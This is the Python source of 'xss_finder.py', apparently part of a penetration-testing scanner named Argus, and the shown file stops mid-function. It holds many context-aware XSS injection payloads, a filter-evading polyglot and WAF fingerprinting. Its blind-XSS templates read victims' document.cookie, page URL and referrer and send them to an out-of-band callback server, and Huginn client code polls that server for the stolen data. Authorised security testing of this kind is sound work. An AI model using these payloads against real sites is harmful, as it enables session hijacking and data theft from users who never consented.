#!/usr/bin/env python3
r"""
auditing_tools/xss_finder.py — Cross-Site Scripting Auditor (v4.0)
═══════════════════════════════════════════════════════════════════════════════

Comprehensive XSS detection for Argus, with self-hosted OOB verification.

v4.0 — Huginn OOB integration + expanded coverage

  HUGINN INTEGRATION (the headline):
    • Blind XSS findings are now first-class: they land in findings[] with
      confirmed=0, then get upgraded to confirmed=1 (severity=CRITICAL,
      confidence=99) when Huginn fires a callback. That's the difference
      between "payload plausible" and "payload proven."
    • _new_huginn_token() emits 32-hex tokens compatible with check.php's
      preg_replace('/[^a-f0-9]/i') + strlen>=16 gate.
    • Path mode by default (oast.example.com/huginn-<token>/) — no wildcard
      TLS cert required, proven against oast.beardedviking.org.
    • Subdomain mode available via --huginn-mode subdomain.
    • verify_blind_findings() polls check.php?token=<hex> and updates the
      JSON report + DB in place. Idempotent — safe to run repeatedly.
    • CLI: --verify-oob runs the poller standalone on an existing scan.

  EXPANDED DETECTION:
    • SVG XSS (image/svg+xml) and XML XSS (text/xml, application/xml)
      are now content-type aware; payloads unchanged, evidence labeled.
    • JSONP callback injection: detects callback/jsonp/cb parameters and
      flags unquoted reflection (classic JSON hijack → XSS primitive).
    • DOM analysis: jQuery < 3.5 detection (CVE-2020-11022/11023 territory),
      dangerous sink highlighting, indent-proximity heuristic retained.
    • Encoding *type* is now reported: entity_named, entity_decimal,
      entity_hex, url_encoded, js_escape, unicode_escape, stripped.

  PAYLOAD EXPANSION:
    • Context payloads: added SVG-native vectors, mathML chains, and a
      polyglot for unknown-context injection points.
    • WAF variants: added entity-quoted, JS \u{...} codepoint, backtick
      string, hex-entity quotes, and null-byte variants.

  ROBUSTNESS:
    • Per-surface error isolation: one malformed surface can't abort the
      scan; failures go to results[] with an error field.
    • Partial results: written even on KeyboardInterrupt (was: lost).
    • Session body cap retained (2 MB).

  COMPATIBILITY (unchanged from v3.1):
    • run_xss_scan(urls_file, outdir, *, ...) signature preserved.
    • All output files + DB schema shape preserved.
    • New kwargs (oob_base_url, huginn_mode, oob_poll_wait) default to
      sane values so existing main.py calls keep working.

Honesty note (unchanged):
  Without a headless browser, this module cannot prove JavaScript executed.
  It proves the payload SURVIVED UNENCODED in a context where a browser
  WOULD execute it — AND, for blind XSS, it proves the payload reached an
  execution environment that made a network callback to *your* server.
  That second signal is strictly stronger than survival evidence.

Integration:
  main.py → run_one("xss") → run_xss_scan(urls_file, outdir,
                                          scan_id=_CURRENT_SCAN_ID)
"""

from __future__ import annotations

import argparse
import hashlib
import json
import logging
import random
import re
import secrets
import statistics
import string
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger("argus.xss_finder")


# ═════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ═════════════════════════════════════════════════════════════════════════════

try:
    import config as CFG
    CFG_LOADED = True
except ImportError:
    CFG = None
    CFG_LOADED = False

try:
    from db import DB
    DB_AVAILABLE = True
except ImportError:
    DB = None
    DB_AVAILABLE = False


def _cfg(key: str, default=None):
    if not CFG_LOADED:
        return default
    return getattr(CFG, key, default)


def _xss_settings() -> dict:
    entry = (_cfg("MODULE_RATE_LIMITS", {}) or {}).get("xss", {})
    return {
        "rate_limit":   entry.get("rate_limit", 3),
        "concurrency":  entry.get("concurrency", 3),
        "timeout":      entry.get("timeout", 12),
        "max_surfaces": entry.get("max_surfaces", 400),
        "test_stored":  entry.get("test_stored", True),
        "test_dom":     entry.get("test_dom", True),
        "test_headers": entry.get("test_headers", False),
        "verify_tls":   entry.get("verify_tls", _cfg("VERIFY_TLS", False)),
    }


def _oob_settings() -> dict:
    """
    Read OOB config once, resolved. Never fails — returns empty domain if
    OOB isn't configured, and callers treat that as "no blind testing."
    """
    mode = (_cfg("OAST_MODE", "huginn") or "huginn").lower()
    domain = (_cfg("OAST_DOMAIN", "") or "").strip()
    base_url = (_cfg("OAST_BASE_URL", "") or "").strip()
    read_key = _cfg("OAST_KEY", "") or _cfg("HUGINN_READ_KEY", "") or ""

    if mode == "disabled" or not domain:
        return {"mode": "disabled", "base_url": "", "read_key": "",
                "domain": ""}

    if base_url:
        if not base_url.startswith(("http://", "https://")):
            base_url = "https://" + base_url
    elif domain:
        base_url = "https://" + domain

    return {
        "mode":     mode,
        "domain":   domain,
        "base_url": base_url.rstrip("/"),
        "read_key": read_key,
    }


def _target_headers() -> dict[str, str]:
    h = dict(_cfg("ACTIVE_HEADERS", {}) or {})
    if CFG_LOADED and getattr(CFG, "AUTH_ENABLED", False):
        auth_hdrs = getattr(CFG, "AUTH_HEADERS", {}) or {}
        if auth_hdrs:
            h.update(auth_hdrs)
    return h


def _db_now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")


# ═════════════════════════════════════════════════════════════════════════════
#  CONSTANTS
# ═════════════════════════════════════════════════════════════════════════════

FINDING_SCHEMA_VERSION = 2       # bumped: blind findings in findings[], oob fields

DEFAULT_TIMEOUT        = 12
BASELINE_SAMPLES       = 2
REQUEST_SLEEP          = 0.08
MAX_URLS               = 5000
MAX_CONTEXT_PAYLOADS   = 6
MAX_DOM_FILES          = 40
MAX_STORED_PAGES       = 15
MAX_RESPONSE_BYTES     = 2_000_000
MARKER_PREFIX          = "argusxss"

HUGINN_TOKEN_BYTES     = 16      # 32 hex chars — over check.php's 16-char min
HUGINN_POLL_INTERVAL   = 8       # seconds between polls (in verify)
HUGINN_POLL_TIMEOUT    = 120     # default per-token max wait

NON_EXECUTABLE_CONTENT_PREFIXES = (
    "image/png", "image/jpeg", "image/gif", "image/webp",
    "image/bmp", "image/x-icon", "image/vnd.microsoft.icon",
    "audio/", "video/", "font/", "application/font",
    "application/octet-stream", "application/pdf",
    "application/zip", "application/x-tar", "application/gzip",
)

JSON_CONTENT_PREFIXES = (
    "application/json", "text/json",
    "application/problem+json", "application/vnd.api+json",
)

SVG_CONTENT_PREFIXES  = ("image/svg+xml",)
XML_CONTENT_PREFIXES  = ("text/xml", "application/xml", "application/xhtml+xml")
MARKDOWN_CONTENT_PREFIXES = ("text/markdown", "text/x-markdown")

HEADER_INJECTION_VECTORS = [
    "User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP",
    "X-Forwarded-Host", "X-Client-IP", "Origin",
]

WAF_SIGNATURES = {
    "cloudflare":  ["cloudflare", "cf-ray", "__cfduid", "cf-cache"],
    "akamai":      ["akamai", "akamai-ghost", "akamaighost"],
    "sucuri":      ["sucuri", "x-sucuri-id", "sucuri.net"],
    "modsecurity": ["mod_security", "modsecurity", "not acceptable"],
    "aws_waf":     ["awswaf", "x-amzn-requestid"],
    "imperva":     ["incap_ses", "visid_incap", "incapsula"],
    "f5_bigip":    ["bigip", "x-wa-info", "big-ip"],
    "barracuda":   ["barra", "barracuda"],
}

WAF_BLOCK_STATUSES = (403, 406, 429, 501)

# JSONP callback parameter names (case-insensitive match against surface.param)
JSONP_PARAM_HINTS = ("callback", "jsonp", "cb", "json_callback", "cbname", "jsoncb")

# jQuery versions below this are vulnerable to html()-with-user-input chains
JQUERY_MIN_SAFE = (3, 5, 0)


# ═════════════════════════════════════════════════════════════════════════════
#  CONTEXT-AWARE PAYLOADS
# ═════════════════════════════════════════════════════════════════════════════

CONTEXT_PAYLOADS: dict[str, list[str]] = {
    "html_body": [
        "<svg onload=alert('{m}')>",
        "<img src=x onerror=alert('{m}')>",
        "<script>alert('{m}')</script>",
        "<details open ontoggle=alert('{m}')>",
        "<iframe srcdoc=\"<script>alert('{m}')</script>\">",
        # mathML mtext chain — survives many filters
        "<math><mtext><table><mglyph><svg><mtext><textarea><path id=x></textarea><img src=x onerror=alert('{m}')>",
    ],
    "attr_double": [
        "\"><svg onload=alert('{m}')>",
        "\" onmouseover=\"alert('{m}')\" x=\"",
        "\" autofocus onfocus=\"alert('{m}')\" x=\"",
        "\"><img src=x onerror=alert('{m}')>",
        "\" onanimationstart=\"alert('{m}')\" style=\"animation:x\" x=\"",
        "\" onpointerover=\"alert('{m}')\" x=\"",
    ],
    "attr_single": [
        "'><svg onload=alert('{m}')>",
        "' onmouseover='alert(\"{m}\")' x='",
        "' autofocus onfocus='alert(\"{m}\")' x='",
        "'><img src=x onerror=alert('{m}')>",
    ],
    "attr_unquoted": [
        " onmouseover=alert('{m}') x=",
        " autofocus onfocus=alert('{m}') x=",
        " onanimationstart=alert('{m}') style=animation:x x=",
        "><svg onload=alert('{m}')>",
    ],
    "event_handler": [
        "alert('{m}')",
        "';alert('{m}')//",
        "\";alert('{m}')//",
        "alert('{m}')//",
    ],
    "script_string_double": [
        "\";alert('{m}')//",
        "\\\";alert('{m}')//",
        "</script><svg onload=alert('{m}')>",
    ],
    "script_string_single": [
        "';alert('{m}')//",
        "\\';alert('{m}')//",
        "</script><svg onload=alert('{m}')>",
    ],
    "script_template": [
        "${alert('{m}')}",
        "`;alert('{m}')//",
        "</script><svg onload=alert('{m}')>",
    ],
    "script_bare": [
        "alert('{m}')",
        ";alert('{m}')//",
        "*/alert('{m}')/*",
    ],
    "url_attr": [
        "javascript:alert('{m}')",
        "javascript:alert('{m}')//",
        "data:text/html,<script>alert('{m}')</script>",
        "&#106;avascript:alert('{m}')",
    ],
    "css": [
        "</style><svg onload=alert('{m}')>",
        "}</style><svg onload=alert('{m}')>",
    ],
    "html_comment": [
        "--><svg onload=alert('{m}')>",
        "--!><svg onload=alert('{m}')>",
        "--><img src=x onerror=alert('{m}')>",
    ],
    "textarea": [
        "</textarea><svg onload=alert('{m}')>",
        "</textarea><img src=x onerror=alert('{m}')>",
    ],
    "title": [
        "</title><svg onload=alert('{m}')>",
        "</title><img src=x onerror=alert('{m}')>",
    ],
    # SVG and XML get their own sets — script works but the chain is different.
    "svg": [
        "<script>alert('{m}')</script>",
        "<svg xmlns='http://www.w3.org/2000/svg' onload=alert('{m}')>",
        "<foreignObject><script>alert('{m}')</script></foreignObject>",
    ],
    "xml": [
        "<script>alert('{m}')</script>",
        "<![CDATA[<script>alert('{m}')</script>]]>",
    ],
    "unknown": [
        # Polyglot: works in multiple contexts simultaneously
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('{m}'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('{m}')//>\\x3e",
        "<svg onload=alert('{m}')>",
    ],
}

DOM_SOURCES = [
    "location.hash", "location.search", "location.href", "location.pathname",
    "document.URL", "document.documentURI", "document.referrer",
    "document.cookie", "window.name", "window.location",
    "document.baseURI", "history.state", "event.data",
    "localStorage", "sessionStorage", "IndexedDB",
    "postMessage", "WebSocket", "EventSource", "Worker",
    "URLSearchParams", "URL", "document.domain",
    "navigator.userAgent", "navigator.language", "screen.name",
]

DOM_SINKS = [
    "innerHTML", "outerHTML", "insertAdjacentHTML",
    "document.write", "document.writeln",
    "eval", "Function", "setTimeout", "setInterval",
    "location.href", "location.assign", "location.replace",
    "window.open", "element.setAttribute",
    "jQuery.html", "jQuery.append", "jQuery.prepend", "jQuery.after",
    "jQuery.before", "$.globalEval", "$.getScript",
    "v-html", "dangerouslySetInnerHTML", "ng-bind-html",
    "createContextualFragment", "Range.createContextualFragment",
    "execScript", "setImmediate", "insertRow",
    "src", "srcdoc", "href",
]

DENIAL_MARKERS = (
    "blocked", "forbidden", "not allowed", "invalid input",
    "input rejected", "malicious", "waf", "sanitized",
    "not permitted", "request denied",
)

ENCODING_CHARS = ["<", ">", '"', "'", "`", "(", ")"]

# Split by encoding type so evidence can report *which* encoding happened.
ENCODED_FORMS_BY_TYPE = {
    "entity_named":   {"<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&apos;"},
    "entity_decimal": {"<": "&#60;", ">": "&#62;", '"': "&#34;", "'": "&#39;",
                       "`": "&#96;", "(": "&#40;", ")": "&#41;"},
    "entity_hex":     {"<": "&#x3c;", ">": "&#x3e;", '"': "&#x22;",
                       "'": "&#x27;", "`": "&#x60;", "(": "&#x28;", ")": "&#x29;"},
    "url_encoded":    {"<": "%3c", ">": "%3e", '"': "%22", "'": "%27",
                       "`": "%60", "(": "%28", ")": "%29"},
    "js_escape":      {'"': '\\"', "'": "\\'", "`": "\\`"},
    "unicode_escape": {"<": "\\u003c", ">": "\\u003e", "(": "\\u0028",
                       ")": "\\u0029"},
}

# Flat set for backwards-compat with code that expects ENCODED_FORMS[ch]
ENCODED_FORMS = {ch: [] for ch in ENCODING_CHARS}
for _forms in ENCODED_FORMS_BY_TYPE.values():
    for _ch, _form in _forms.items():
        ENCODED_FORMS.setdefault(_ch, []).append(_form)

CSP_BYPASS_HOSTS = [
    "ajax.googleapis.com", "cdnjs.cloudflare.com", "cdn.jsdelivr.net",
    "unpkg.com", "code.jquery.com", "maxcdn.bootstrapcdn.com",
    "stackpath.bootstrapcdn.com", "www.google.com", "accounts.google.com",
]

STORED_REVISIT_PATTERNS = [
    "/", "/profile", "/account", "/dashboard", "/settings",
    "/comments", "/messages", "/posts", "/feed", "/notifications",
    "/admin", "/admin/users", "/support", "/tickets",
]

# ── Blind (OOB) payload templates ─────────────────────────────────────────
# All placeholders: {oob} = full payload URL (path or subdomain mode)
# Huginn serves JSON on the base path, which is fine — <script src> still
# fires the request even though the JSON isn't valid JS.

_BLIND_FETCH = (
    "<script>(function(){{"
    "var d={{u:location.href.slice(0,500),c:document.cookie.slice(0,2000),"
    "d:document.domain,r:document.referrer.slice(0,500),"
    "ls:(function(){{try{{return localStorage.length}}catch(e){{return 0}}}})(),"
    "ss:(function(){{try{{return sessionStorage.length}}catch(e){{return 0}}}})(),"
    "ua:navigator.userAgent.slice(0,200)}};"
    "fetch('{oob}',{{method:'POST',mode:'no-cors',"
    "headers:{{'Content-Type':'application/json'}},"
    "body:JSON.stringify(d)}}).catch(function(){{}})"
    "}})();</script>"
)

_BLIND_IMAGE = (
    "<script>(new Image()).src='{oob}?c='"
    "+encodeURIComponent(document.cookie.slice(0,1500))"
    "+'&u='+encodeURIComponent(location.href.slice(0,1500))"
    "+'&d='+encodeURIComponent(document.domain)"
    "</script>"
)

_BLIND_SVG = (
    "<svg onload=\"fetch('{oob}?c='+encodeURIComponent(document.cookie)"
    "+'&u='+encodeURIComponent(location.href))\">"
)

_BLIND_IMG_ATTR = (
    "<img src='{oob}?c=x' "
    "onerror=\"this.src='{oob}?c='+encodeURIComponent(document.cookie)"
    "+'&u='+encodeURIComponent(location.href)\">"
)

_BLIND_SCRIPT_SRC = "<script src='{oob}'></script>"

BLIND_PAYLOAD_TEMPLATES = [
    ("fetch_post",  _BLIND_FETCH),
    ("image",       _BLIND_IMAGE),
    ("svg_onload",  _BLIND_SVG),
    ("img_attr",    _BLIND_IMG_ATTR),
    ("script_src",  _BLIND_SCRIPT_SRC),
]


# ═════════════════════════════════════════════════════════════════════════════
#  DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class Baseline:
    url: str
    param: str
    location: str = "query"
    status: int = 0
    length: int = 0
    body: str = ""
    content_type: str = ""
    median_time: float = 0.0
    waf: str = ""

    def to_dict(self) -> dict:
        return {
            "url": self.url, "param": self.param, "location": self.location,
            "status": self.status, "length": self.length,
            "median_time": round(self.median_time, 3),
            "waf": self.waf,
        }


@dataclass
class XSSFinding:
    target: str
    param: str
    xss_type: str
    context: str = ""
    severity: str = "MEDIUM"
    confidence: int = 50
    confirmed: bool = False
    payload: str = ""
    marker: str = ""
    evidence: str = ""
    bypass_used: str = ""
    encoded_chars: list[str] = field(default_factory=list)
    survived_chars: list[str] = field(default_factory=list)
    param_location: str = "query"
    http_status: int = 0
    auth_enabled: bool = False
    first_seen: str = ""
    details: dict = field(default_factory=dict)

    @property
    def finding_hash(self) -> str:
        raw = (
            f"{self.target}|{self.param}|{self.param_location}|"
            f"{self.xss_type}|{self.context}"
        )
        return hashlib.sha256(raw.encode()).hexdigest()

    @property
    def target_host(self) -> str:
        return urllib.parse.urlparse(self.target).hostname or ""

    def to_dict(self) -> dict:
        return {
            "schema_version": FINDING_SCHEMA_VERSION,
            "target":         self.target,
            "target_host":    self.target_host,
            "param_name":     self.param,
            "param_location": self.param_location,
            "xss_type":       self.xss_type,
            "context":        self.context,
            "severity":       self.severity,
            "confidence":     self.confidence,
            "confirmed":      1 if self.confirmed else 0,
            "payload":        (self.payload or "")[:2048],
            "marker":         self.marker,
            "evidence":       (self.evidence or "")[:1024],
            "bypass_used":    self.bypass_used,
            "encoded_chars":  self.encoded_chars,
            "survived_chars": self.survived_chars,
            "http_status":    self.http_status,
            "details":        self.details,
            "auth_enabled":   1 if self.auth_enabled else 0,
            "finding_hash":   self.finding_hash,
            "first_seen":     self.first_seen or _db_now(),
        }


# ═════════════════════════════════════════════════════════════════════════════
#  RATE LIMITER (adaptive, thread-safe)
# ═════════════════════════════════════════════════════════════════════════════

class SharedRateLimiter:
    def __init__(self, rate_limit: float, backoff_max: float = 30.0):
        self.min_interval = 1.0 / rate_limit if rate_limit and rate_limit > 0 else 0.0
        self._last = 0.0
        self._lock = threading.Lock()
        self._backoff_until = 0.0
        self._backoff_max = backoff_max
        self._consecutive_blocks = 0
        self._block_lock = threading.Lock()

    def wait(self) -> None:
        if self.min_interval <= 0:
            return
        with self._lock:
            while True:
                now = time.monotonic()
                wait_until = max(self._last + self.min_interval, self._backoff_until)
                if now >= wait_until:
                    break
                time.sleep(wait_until - now)
            self._last = time.monotonic()

    def note_response(self, status: int) -> None:
        with self._block_lock:
            if status in (429, 503):
                self._consecutive_blocks += 1
                backoff = min(
                    self._backoff_max,
                    (2 ** min(self._consecutive_blocks, 6)) * 0.25,
                )
                self._backoff_until = time.monotonic() + backoff
                log.debug(f"rate-limiter: backoff {backoff:.2f}s after {status}")
            elif 200 <= status < 400:
                if self._consecutive_blocks:
                    log.debug("rate-limiter: backoff reset")
                self._consecutive_blocks = 0


# ═════════════════════════════════════════════════════════════════════════════
#  SESSION
# ═════════════════════════════════════════════════════════════════════════════

class Session:
    def __init__(
        self, limiter: SharedRateLimiter, headers: dict, timeout: int,
        *, verify_tls: bool = False, max_bytes: int = MAX_RESPONSE_BYTES,
    ):
        self.session = requests.Session()
        self.session.verify = verify_tls
        if headers:
            self.session.headers.update(headers)
        self.session.headers.setdefault("User-Agent", "Argus-XSS-Auditor/4.0")
        self.session.headers.setdefault(
            "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        )
        self._limiter = limiter
        self.timeout = timeout
        self.max_bytes = max_bytes
        if not verify_tls:
            log.warning("TLS verification disabled (verify_tls=False) — engagement-only")

    def request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        self._limiter.wait()
        try:
            resp = self.session.request(
                method, url,
                timeout=kwargs.pop("timeout", self.timeout),
                allow_redirects=kwargs.pop("allow_redirects", False),
                stream=True,
                **kwargs,
            )
        except requests.RequestException as e:
            log.debug(f"request failed: {method} {_redact_url(url)}: {e}")
            return None

        self._limiter.note_response(resp.status_code)

        try:
            resp._content = resp.raw.read(self.max_bytes, decode_content=True)
        except Exception:
            resp._content = b""
        return resp

    def get(self, url: str, **kwargs):
        return self.request("GET", url, **kwargs)


# ═════════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ═════════════════════════════════════════════════════════════════════════════

_SECRET_PARAM_RE = re.compile(
    r"(?i)(cookie|authorization|token|api[_-]?key|secret|password|session|bearer)"
)


def _redact_url(url: str, max_len: int = 240) -> str:
    try:
        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            return url[:max_len]
        pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        redacted = [
            (k, "***" if _SECRET_PARAM_RE.search(k) else v)
            for k, v in pairs
        ]
        clean = urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(redacted, safe=""))
        )
        return clean[:max_len]
    except Exception:
        return url[:max_len]


def _load_urls(input_file: Path) -> list[str]:
    if not input_file.exists():
        return []
    urls: list[str] = []
    seen: set[str] = set()
    for line in input_file.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        token = line.split()[0]
        if not token.startswith(("http://", "https://")):
            token = "https://" + token
        if token not in seen:
            seen.add(token)
            urls.append(token)
    return urls


def _inject_query(url: str, param: str, payload: str) -> str:
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    new = [(k, payload if k == param else v) for k, v in params]
    return urllib.parse.urlunparse(
        parsed._replace(
            query=urllib.parse.urlencode(new, safe=":/?=%{}<>*#$@'\"`()[],!")
        )
    )


def _body(resp: Optional[requests.Response], limit: int = MAX_RESPONSE_BYTES) -> str:
    if resp is None:
        return ""
    try:
        return resp.text[:limit]
    except Exception:
        return ""


def _new_marker() -> str:
    return MARKER_PREFIX + "".join(
        random.choices(string.ascii_lowercase + string.digits, k=10)
    )


def _new_huginn_token() -> str:
    """
    32-hex-char token. Huginn's check.php sanitises with
    preg_replace('/[^a-f0-9]/i') then enforces strlen >= 16; 32 hex = 128 bits.
    """
    return secrets.token_hex(HUGINN_TOKEN_BYTES)


def _looks_denied(resp: Optional[requests.Response]) -> bool:
    if resp is None:
        return True
    if 200 <= resp.status_code < 300:
        body_low = _body(resp).lower()[:2000]
        return any(m in body_low for m in DENIAL_MARKERS)
    return False


def _fingerprint_waf(resp: Optional[requests.Response]) -> str:
    if resp is None:
        return ""
    headers_str = " ".join(f"{k} {v}" for k, v in resp.headers.items()).lower()
    body_low = _body(resp).lower()[:2000]
    for waf, sigs in WAF_SIGNATURES.items():
        for sig in sigs:
            if sig in headers_str or sig in body_low:
                return waf
    return ""


def _content_type_kind(ct: str) -> str:
    """Classify content-type into a coarse kind for handling decisions."""
    ct = (ct or "").split(";")[0].strip().lower()
    if not ct:
        return "unknown"
    for p in NON_EXECUTABLE_CONTENT_PREFIXES:
        if ct.startswith(p):
            return "binary"
    for p in JSON_CONTENT_PREFIXES:
        if ct.startswith(p):
            return "json"
    for p in SVG_CONTENT_PREFIXES:
        if ct.startswith(p):
            return "svg"
    for p in XML_CONTENT_PREFIXES:
        if ct.startswith(p):
            return "xml"
    for p in MARKDOWN_CONTENT_PREFIXES:
        if ct.startswith(p):
            return "markdown"
    return "html"          # html, xhtml, text/*, unknown


def _is_executable_content_type(ct: str) -> bool:
    return _content_type_kind(ct) != "binary"


def _probe(
    session: Session, surface: dict, payload: str,
    extra_headers: Optional[dict] = None,
) -> Optional[requests.Response]:
    headers = extra_headers or None
    if surface["location"] == "query":
        return session.get(
            _inject_query(surface["url"], surface["param"], payload),
            **({"headers": headers} if headers else {}),
        )
    if surface["location"] == "body":
        return session.request(
            surface.get("method", "POST"), surface["url"],
            data={surface["param"]: payload},
            **({"headers": headers} if headers else {}),
        )
    return None


# ═════════════════════════════════════════════════════════════════════════════
#  HUGINN OOB CLIENT
# ═════════════════════════════════════════════════════════════════════════════

class HuginnClient:
    """
    Read-side client for a Huginn OOB receiver.

    Single-token lookup (?token=<hex>) is public by Huginn's design — knowing
    the token IS the proof of ownership (Burp Collaborator model). The
    read_key is optional and reserved for aggregate views (?list, ?tail).

    Thread-safe: one requests.Session per instance; callers instantiate once.
    """

    def __init__(
        self, base_url: str, *,
        read_key: Optional[str] = None,
        timeout: int = 10,
        verify_tls: bool = True,
    ):
        self.base_url = base_url.rstrip("/")
        self.check_url = f"{self.base_url}/check.php"
        self.read_key = read_key or ""
        self.timeout = timeout
        self._session = requests.Session()
        self._session.verify = verify_tls
        self._session.headers["User-Agent"] = "Argus-XSS-Auditor/4.0 (huginn)"
        if self.read_key:
            self._session.headers["Authorization"] = f"Bearer {self.read_key}"

    # ── Payload URL construction ────────────────────────────────────────────
    def payload_url_path(self, token: str) -> str:
        """Path mode — no wildcard DNS/cert required."""
        return f"{self.base_url}/huginn-{token}/"

    def payload_url_subdomain(self, token: str) -> str:
        """Subdomain mode — requires *.oast.<domain> DNS + wildcard cert."""
        host = urllib.parse.urlparse(self.base_url).hostname or ""
        return f"https://{token}.{host}/"

    # ── Read side ───────────────────────────────────────────────────────────
    def check_token(self, token: str) -> dict:
        """
        Returns {'found': bool, 'entries': [...], 'error': str?}
        Never raises — network errors become found=False.
        """
        try:
            r = self._session.get(
                self.check_url, params={"token": token}, timeout=self.timeout,
            )
        except requests.RequestException as e:
            return {"found": False, "entries": [], "error": f"network: {e}"}

        if r.status_code >= 400:
            return {"found": False, "entries": [],
                    "error": f"HTTP {r.status_code}: {r.text[:200]}"}

        try:
            j = r.json()
        except ValueError:
            return {"found": False, "entries": [], "error": "non-JSON reply"}

        entries = j.get("entries") or []
        if not entries and j.get("entry"):
            entries = [j["entry"]]
        return {"found": bool(j.get("found")), "entries": entries}

    def poll_until_hit(
        self, token: str, *,
        max_wait: int = HUGINN_POLL_TIMEOUT,
        interval: int = HUGINN_POLL_INTERVAL,
    ) -> dict:
        deadline = time.monotonic() + max_wait
        last = {"found": False, "entries": []}
        while True:
            last = self.check_token(token)
            if last.get("found"):
                return last
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                return last
            time.sleep(min(interval, remaining))


# ═════════════════════════════════════════════════════════════════════════════
#  SURFACE DISCOVERY
# ═════════════════════════════════════════════════════════════════════════════

def discover_query_surfaces(urls: list[str]) -> list[dict]:
    surfaces: list[dict] = []
    seen: set[tuple] = set()
    for url in urls:
        parsed = urllib.parse.urlparse(url)
        for pname in urllib.parse.parse_qs(parsed.query):
            key = (url, pname, "query")
            if key in seen:
                continue
            seen.add(key)
            surfaces.append({
                "url": url, "param": pname, "location": "query", "method": "GET",
            })
    return surfaces


def discover_body_surfaces(outdir: Path) -> list[dict]:
    pages_file = outdir / "site_pages.json"
    if not pages_file.exists():
        return []
    try:
        data = json.loads(pages_file.read_text())
    except Exception:
        return []

    surfaces: list[dict] = []
    seen: set[tuple] = set()
    for page in data.get("pages") or []:
        page_url = page.get("url") or ""
        for form in page.get("forms") or []:
            if (form.get("method") or "").upper() != "POST":
                continue
            action = form.get("action") or page_url
            for field_def in form.get("fields") or []:
                fname = field_def.get("name") or ""
                if not fname:
                    continue
                key = (action, fname, "body")
                if key in seen:
                    continue
                seen.add(key)
                surfaces.append({
                    "url": action, "param": fname,
                    "location": "body", "method": "POST",
                })
    return surfaces


# ═════════════════════════════════════════════════════════════════════════════
#  BASELINE
# ═════════════════════════════════════════════════════════════════════════════

def build_baseline(session: Session, surface: dict) -> Baseline:
    baseline = Baseline(
        url=surface["url"], param=surface["param"],
        location=surface["location"],
    )
    times: list[float] = []

    for _ in range(BASELINE_SAMPLES):
        start = time.monotonic()
        if surface["location"] == "body":
            resp = session.request(
                surface.get("method", "POST"), surface["url"],
                data={surface["param"]: "argusbaseline"},
            )
        else:
            resp = session.get(surface["url"])
        times.append(time.monotonic() - start)
        if resp and not baseline.status:
            baseline.status = resp.status_code
            baseline.body = _body(resp)
            baseline.length = len(baseline.body)
            baseline.content_type = resp.headers.get("Content-Type", "")
            baseline.waf = _fingerprint_waf(resp)
        time.sleep(REQUEST_SLEEP)

    if times:
        baseline.median_time = statistics.median(times)
    return baseline


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 1 — REFLECTION PROBE
# ═════════════════════════════════════════════════════════════════════════════

def _marker_in_encoded_form(body: str, marker: str) -> bool:
    if not marker:
        return False
    if "".join(f"&#{ord(c)};" for c in marker) in body:
        return True
    if "".join(f"&#x{ord(c):x};" for c in marker) in body:
        return True
    return False


def probe_reflection(session: Session, surface: dict) -> dict:
    marker1 = _new_marker()
    resp = _probe(session, surface, marker1)
    time.sleep(REQUEST_SLEEP)

    result = {"reflected": False, "index": -1, "marker": marker1,
              "unencoded": False, "cache_hit": False}
    if resp is None:
        return result

    body = _body(resp)
    idx = body.find(marker1)
    if idx >= 0:
        result["reflected"] = True
        result["index"] = idx
        result["unencoded"] = True
    elif _marker_in_encoded_form(body, marker1):
        result["reflected"] = True
        result["unencoded"] = False
        return result
    else:
        return result

    marker2 = _new_marker()
    resp2 = _probe(session, surface, marker2)
    time.sleep(REQUEST_SLEEP)
    if resp2 is None:
        return result
    body2 = _body(resp2)
    if marker2 not in body2:
        result["cache_hit"] = True
        result["reflected"] = False
        return result

    return result


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — CONTEXT CLASSIFIER
# ═════════════════════════════════════════════════════════════════════════════

def classify_context(body: str, index: int) -> str:
    if index < 0 or index >= len(body):
        return "unknown"

    prefix = body[:index].lower()

    in_comment = False
    in_script = False
    in_style = False
    in_raw_text = ""
    in_tag = False
    quote = ""
    last_attr = ""
    in_js_string = ""
    js_escape = False

    i = 0
    n = len(prefix)
    while i < n:
        ch = prefix[i]

        if in_comment:
            if prefix.startswith("-->", i):
                in_comment = False
                i += 3
                continue
            i += 1
            continue

        if in_raw_text:
            close = f"</{in_raw_text}"
            if prefix.startswith(close, i):
                in_raw_text = ""
                i += len(close)
                continue
            i += 1
            continue

        if in_script:
            if prefix.startswith("</script", i):
                in_script = False
                in_style = False
                i += 8
                continue
            if in_style:
                if prefix.startswith("</style", i):
                    in_style = False
                    in_script = False
                    i += 7
                    continue
                i += 1
                continue
            if js_escape:
                js_escape = False
                i += 1
                continue
            if ch == "\\":
                js_escape = True
                i += 1
                continue
            if in_js_string:
                if ch == in_js_string:
                    in_js_string = ""
                i += 1
                continue
            if ch in ("'", '"', "`"):
                in_js_string = ch
                i += 1
                continue
            i += 1
            continue

        if in_tag:
            if quote:
                if ch == quote:
                    quote = ""
                i += 1
                continue
            if ch in ("'", '"'):
                quote = ch
                i += 1
                continue
            if ch == ">":
                in_tag = False
                last_attr = ""
                i += 1
                continue
